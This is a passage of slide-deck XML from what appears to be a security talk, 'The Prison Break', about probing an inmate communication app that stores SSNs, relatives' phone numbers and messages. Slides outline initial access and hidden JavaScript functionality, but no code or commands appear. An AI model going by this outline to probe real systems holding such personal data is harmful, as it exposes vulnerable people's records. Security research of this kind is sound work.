                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>And they thought I was working with an insider haha</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="262" name="Google Shape;262;p36"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="663912" y="2476300"/>
            <a:ext cx="7816176" cy="880975"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="266" name="Shape 266"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="267" name="Google Shape;267;p37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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8" name="Google Shape;268;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="269" name="Google Shape;269;p37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="1940700"/>
            <a:ext cx="7595100" cy="7233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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>The Prison Break</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="273" name="Shape 273"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="274" name="Google Shape;274;p38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="275" name="Google Shape;275;p38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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6" name="Google Shape;276;p38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="277" name="Google Shape;277;p38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777300" y="266850"/>
            <a:ext cx="4695300" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Prison Break</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="278" name="Google Shape;278;p38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="3078300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-368300" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2200">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Created to allow inmates to talk to </a:t>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Visitors </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Make requests (medical, food, etc)</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-368300" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2200">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Records</a:t>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Inmate Information (email, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>SSN, Relatives phone numbers, etc)</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Conversations (attachments, messages, etc)</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800" u="sng">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t> No actual prisons or prisoners  were harmed in this process </a:t>
            </a:r>
            <a:endParaRPr sz="1800" u="sng">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="282" name="Shape 282"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="283" name="Google Shape;283;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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4" name="Google Shape;284;p39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="2816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2200">
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>app.prisonsystem.fake</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2200">
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="2200">
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-368300" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2200">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Limited functionality (nearly nothing)</a:t>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Javascript files</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>indicated some functionality does exist</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="914400" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Shortcuts linking to other applications</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Session is limited to current application (for now)</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>Anything else redirects us back to our current application</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="285" name="Google Shape;285;p39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="286" name="Google Shape;286;p39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777300" y="266850"/>
            <a:ext cx="5384100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Initial Access</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="287" name="Google Shape;287;p39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="291" name="Shape 291"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="292" name="Google Shape;292;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;293;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="294" name="Google Shape;294;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="338175"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Application Shortcuts</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="295" name="Google Shape;295;p40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="296" name="Google Shape;296;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="3061500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Courier New"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
